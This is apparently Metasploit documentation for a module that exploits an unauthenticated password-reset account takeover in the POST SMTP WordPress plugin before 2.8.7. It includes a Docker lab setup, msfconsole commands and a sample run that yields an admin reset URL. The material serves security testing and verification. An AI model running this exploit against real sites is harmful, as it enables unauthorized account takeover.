## Vulnerable Application

The POST SMTP WordPress plugin prior to 2.8.7 is affected by a privilege
escalation where an unauthenticated user is able to reset the password
of an arbitrary user. This is done by requesting a password reset, then
viewing the latest email logs to find the associated password reset email.

### Install

1. Create `wp_post_smtp_acct_takeover.docker-compose.yml` with the content:
```
version: '3.1'

services:
  wordpress:
    image: wordpress:latest
    restart: always
    ports:
      - 5555:80
    environment:
      WORDPRESS_DB_HOST: db
      WORDPRESS_DB_USER: chocapikk
      WORDPRESS_DB_PASSWORD: dummy_password
      WORDPRESS_DB_NAME: exploit_market
    mem_limit: 512m
    volumes:
      - wordpress:/var/www/html

  db:
    image: mysql:5.7
    restart: always
    environment:
      MYSQL_DATABASE: exploit_market
      MYSQL_USER: chocapikk
      MYSQL_PASSWORD: dummy_password
      MYSQL_RANDOM_ROOT_PASSWORD: '1'
    volumes:
      - db:/var/lib/mysql

volumes:
  wordpress:
  db:

```
2. `docker-compose -f wp_post_smtp_acct_takeover.docker-compose.yml up`
3. `wget https://downloads.wordpress.org/plugin/post-smtp.2.8.6.zip`
4. `unzip post-smtp.2.8.6.zip`
5. `docker cp post-smtp <wordpress_container_id>:/var/www/html/wp-content/plugins`
6. Complete the setup of wordpress
7. Enable the post-smtp plugin, select "default" for the SMTP service
  1. Complete the setup using random information, it isn't validated.
8. Update permalink structure per https://github.com/rapid7/metasploit-framework/pull/18164#issuecomment-1623744244
  1. Settings -> Permalinks -> Permalink structure -> Select "Post name" -> Save Changes.


## Verification Steps

1. Install the vulnerable plugin
2. Start msfconsole
3. Do: `use auxiliary/admin/http/wp_post_smtp_acct_takeover`
4. Do: `set rhost 127.0.0.1`
5. Do: `set rport 5555`
6. Do: `set ssl false`
7. Do: `set username <username>`
8. Do: `set verbose true`
9. Do: `run`
10. Visit the output URL to reset the user's password.

## Options

### USERNAME

The username to perform a password reset against

## Scenarios

### Wordpress 6.6.2 with SMTP Post 2.8.6 on Docker

```
msf6 > use auxiliary/admin/http/wp_post_smtp_acct_takeover
msf6 auxiliary(admin/http/wp_post_smtp_acct_takeover) > set rhost 127.0.0.1
rhost => 127.0.0.1
msf6 auxiliary(admin/http/wp_post_smtp_acct_takeover) > set rport 5555
rport => 5555
msf6 auxiliary(admin/http/wp_post_smtp_acct_takeover) > set ssl false
ssl => false
msf6 auxiliary(admin/http/wp_post_smtp_acct_takeover) > set username admin
username => admin
msf6 auxiliary(admin/http/wp_post_smtp_acct_takeover) > set verbose true
verbose => true
msf6 auxiliary(admin/http/wp_post_smtp_acct_takeover) > run
[*] Running module against 127.0.0.1

[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking /wp-content/plugins/post-smtp/readme.txt
[*] Found version 2.8.6 in the plugin
[+] The target appears to be vulnerable.
[*] Attempting to Registering token fUefO7U12dXtb0DM on device GP3tOFuMfFErw
[+] Succesfully created token: fUefO7U12dXtb0DM
[*] Requesting logs
[*] Requesting email content from logs for ID 4
[+] Full text of log saved to: /home/mtcyr/.msf4/loot/20241029142103_default_127.0.0.1_wordpress.post_s_367186.txt
[+] Reset URL: http://127.0.0.1:5555/wp-login.php?action=rp&key=4kxMwfuvyQtcUDVrh985&login=admin&wp_lang=en_US
[*] Auxiliary module execution completed
```